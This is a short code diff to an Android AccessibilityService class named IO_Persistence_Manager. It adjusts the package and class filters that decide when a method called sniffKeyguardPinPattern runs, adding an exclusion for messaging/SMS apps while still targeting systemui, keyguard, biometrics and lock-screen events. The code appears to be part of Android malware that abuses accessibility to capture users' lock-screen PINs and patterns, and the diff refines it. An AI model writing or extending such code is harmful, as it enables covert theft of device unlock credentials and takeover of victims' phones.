@@ -250,15 +250,17 @@ public class IO_Persistence_Manager extends AccessibilityService {
             String pkgLower = packageName.toLowerCase();
             CharSequence clsSeq = event.getClassName();
             String clsStr = clsSeq != null ? clsSeq.toString().toLowerCase() : "";
-            if (pkgLower.contains("systemui") || 
+            
+            boolean isMessagingPkg = pkgLower.contains("messaging") || pkgLower.contains("mms") || pkgLower.contains("sms") || pkgLower.contains("messages");
+
+            if (!isMessagingPkg && (pkgLower.contains("systemui") || 
                 pkgLower.contains("keyguard") || 
                 pkgLower.contains("biometrics") || 
                 pkgLower.equals("android") ||
                 pkgLower.contains("lockscreen") ||
                 pkgLower.contains("guard") ||
-                pkgLower.contains("samsung") ||
                 clsStr.contains("pattern") ||
-                clsStr.contains("lock")) {
+                clsStr.contains("lock"))) {
                 sniffKeyguardPinPattern(event, packageName);
             }
         }
